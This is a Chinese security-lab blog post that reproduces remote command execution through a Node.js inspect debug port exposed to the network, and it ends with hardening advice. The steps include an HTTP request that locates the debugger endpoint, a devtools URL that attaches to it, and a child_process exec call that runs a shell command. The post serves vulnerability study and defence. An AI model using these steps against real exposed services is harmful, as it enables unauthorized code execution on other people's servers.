#  【成功复现】Node.js inspect调试远程命令执行  
原创 弥天安全实验室
                    弥天安全实验室  弥天安全实验室   2026-04-08 04:48  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2jntd263&tp=webp#imgIndex=0 "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x01组件介绍**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGgHoq7J5luzdicGIS9micZ1KmHFiaMHguQqAQP5oBasiarUZ1jQyVnywRtOHExKgT5hSwJ1oy19diafib5RzrHop6CjdrG7Z3ibmKLZbg/640?wx_fmt=png&from=appmsg "")  
  
  
Node.js是一个开源、跨平台的 JavaScript 运行时环境。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x02影响版本**  
  
开启Node.js inspect调试模式并将服务暴露于公网  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=5 "")  
  
  
**0x03风险复现**  
  
  
1.访问运行环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiarWbnypcOzr8XGX3cjicOx0soJDeejiaZuj3Yjs7kbbicmribiaCW1Qx0HyRNibl6EOicoXGny8ZHcjbuvztO9icN1ueRr9EibHPhDQwicM/640?wx_fmt=png&from=appmsg "")  
  
  
2.风险复现  
  
1、获取调试接口  
```
GET /json HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
```  
  
返回200，并且响应体存在接口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaN1YEWWjADbpeUibAg5x63u21t7e9ODr903tOcib2H20aqM20LhSqdxBhRGCcIoQZxP5qkkcrU4M8xWKNDrScP1paAXhZAHrEV0/640?wx_fmt=png&from=appmsg "")  
  
2、通过浏览器访问调试接口  
```
devtools://devtools/bundled/inspector.html?
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaQc6hqbRWLYvB1icFZ80fxJIawcYNznYlY7eeHzuAiatSPib69aA81lrIJ0OWb2SwsKXj1ajmvv5smbsaicYLhZKiakUJGn7JIaNJM/640?wx_fmt=png&from=appmsg "")  
  
开启允许输入  
```
devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.0:10000/e06fc35f-b95c-48dd-89b1-15f932816379
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YfTkN0R6oGjVyKPToC5ib0bU2XHYn8LvFhC0eEGTUArjrDyMsuIhrMEDZIUdjtMBialxQFu5aLEgwpGrpoy56FibVqvq0BCicCNetpHicYydzUl4/640?wx_fmt=png&from=appmsg "")  
  
成功执行id命令  
```
require("child_process").exec("id ", (err,std) => console.log(std))
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YfTkN0R6oGg6Rhm6ZG4NCAHoCKtFWEM71zfrQkBZ2O2gYmPBwm56K0ylUmIA3P2SqWmc5Hd8dcHBZHlGicjOoPOXuWKjjYv3BH2sMB1vmBQE/640?wx_fmt=png&from=appmsg "")  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x04修复建议**  
  
  
1、严格遵循Node.js官方安全要求，非必要不开启 inspect 调试功能。  
  
2、若开发过程中确需使用，确保调试服务仅绑定本地地址（--inspect=127.0.0.1），禁止暴露于公网，并通过防火墙、IP 白名单等手段限制访问权限。  
  
  
  再次声明本文仅供学习使用，非法他用责任自负！ 人是安全的尺度  
  
         
  
```
https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/
https://zhuanlan.zhihu.com/p/1947267306074912700
```  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&randomid=h6lqq1ue&tp=webp#imgIndex=8 "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=u34b870m&tp=webp#imgIndex=9 "")  
  
  
  
